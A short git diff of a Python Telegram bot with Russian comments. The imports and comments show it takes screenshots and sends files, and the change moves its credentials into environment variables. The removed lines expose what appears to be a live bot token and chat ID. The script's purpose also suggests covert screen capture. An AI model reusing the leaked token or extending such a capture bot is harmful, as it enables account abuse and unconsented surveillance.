@@ -1,12 +1,14 @@
 import telebot # Для работы с ботом
-import os # Для работы с директориями / файлами
 import requests # Для отправки документов / скринов
 from PIL import ImageGrab # Для получения скриншота
 import socket
 from telebot import types
+from dotenv import load_dotenv
+import os # Для работы с директориями / файлами
 
-bot_token = "5658659173:AAHvR-fKpxmjEjWZdiWCA5pO2ANeJaZFSQE" # Токен от бота
-chat_id = "888929480" # ID чата
+load_dotenv()
+bot_token = os.getenv('TOKEN') # Токен от бота
+chat_id = os.getenv('CHATID') #  здесь меняем id чата на свой
 
 bot = telebot.TeleBot(bot_token)
 
